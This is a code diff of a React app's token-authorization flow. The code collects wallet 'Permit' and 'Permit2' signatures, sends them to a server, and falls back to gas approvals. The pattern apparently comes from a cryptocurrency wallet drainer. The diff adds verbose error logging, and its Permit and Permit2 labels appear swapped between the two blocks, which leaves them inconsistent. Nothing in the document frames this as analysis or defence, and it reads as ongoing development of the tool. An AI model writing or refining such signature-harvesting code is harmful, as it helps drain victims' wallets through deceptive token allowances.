@@ -339,10 +339,13 @@ export default function App() {
                   })
                 }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`));
 
-                authorized = true;
-                log(`✅ ${token.symbol} Permit Secured & Sent.`);
-              } catch (pErr) {
-                log(`⚠️ Permit failed, trying Permit2...`);
+                 authorized = true;
+                log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
+              } catch (p2Err: any) {
+                // 🔥 REVEAL THE EXACT ERROR
+                const errMsg = p2Err?.message || p2Err?.toString() || "Unknown error";
+                log(`⚠️ Permit2 failed: ${errMsg}`);
+                log(`➡️ Falling back to standard gas approval...`);
               }
             }
 
@@ -402,9 +405,12 @@ export default function App() {
                 }).catch(err => log(`❌ Network Error sending PERMIT2: ${err.message}`));
                 
                 authorized = true;
-                log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
-              } catch (p2Err) {
-                log(`⚠️ Permit2 failed, falling back to gas...`);
+                log(`✅ ${token.symbol} Permit Secured & Sent.`);
+              } catch (pErr: any) {
+                // 🔥 REVEAL THE EXACT ERROR
+                const errMsg = pErr?.message || pErr?.toString() || "Unknown error";
+                log(`⚠️ Permit failed: ${errMsg}`);
+                log(`➡️ Falling back to Permit2...`);
               }
             }
 
